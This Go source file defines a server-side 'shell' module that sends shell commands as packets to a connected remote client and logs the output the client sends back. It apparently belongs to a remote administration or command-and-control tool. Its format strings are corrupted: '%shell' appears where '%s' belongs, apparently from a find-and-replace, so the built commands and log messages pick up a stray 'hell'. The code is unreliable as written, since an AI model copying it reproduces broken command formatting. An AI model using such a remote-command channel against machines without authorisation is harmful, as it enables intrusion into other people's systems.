package shell

import (
	"fmt"
	"strings"

	"server/internal/mod"
	"server/internal/net"
	"server/internal/utility/asynlog"
	"server/internal/utility/panic"
)

const (
	// Shell means the packet is related to shell commands.
	Shell net.PktType = 3

	msgBorder string = "----------------------------------------------------"
)

type shell struct {
	currClient net.Client
	asynlog.Logger
}

// New creates a new shell module.
func New(logger asynlog.Logger) mod.Mod {
	return &shell{
		Logger: logger,
	}
}

func (shell *shell) Exec(cmd string, args []string) error {
	panic.Assert(cmd == "exec", "Invalid command.")

	if shell.currClient == nil {
		return fmt.Errorf("The current client is null")
	}

	entireCmd := fmt.Sprintf("%shell%shell", strings.Join(args, " "), "\r\n")

	pkg := net.NewPacket()
	pkg.Type = Shell
	pkg.Write([]byte(entireCmd))
	return shell.currClient.SendPacket(pkg)
}

func (*shell) Cmds() []string {
	return []string{
		"exec",
	}
}

func (shell *shell) Respond(client net.Client, pkg *net.Packet) error {
	panic.Assert(pkg.Type == Shell, "Invalid packet type.")

	msg := fmt.Sprintf("Shell messages from the client [%v]:\n%shell\n%shell\n%shell\n",
		client.ID(), msgBorder, string(pkg.Data), msgBorder)

	shell.Store(msg)
	return nil
}

func (*shell) Packets() []net.PktType {
	return []net.PktType{
		Shell,
	}
}

func (*shell) ID() mod.ID {
	return 1
}

func (*shell) Name() string {
	return "SHELL"
}

func (shell *shell) String() string {
	return fmt.Sprintf("%d-%s", shell.ID(), shell.Name())
}

func (shell *shell) SetClient(client net.Client) {
	shell.currClient = client
}

func (*shell) Close() error {
	return nil
}
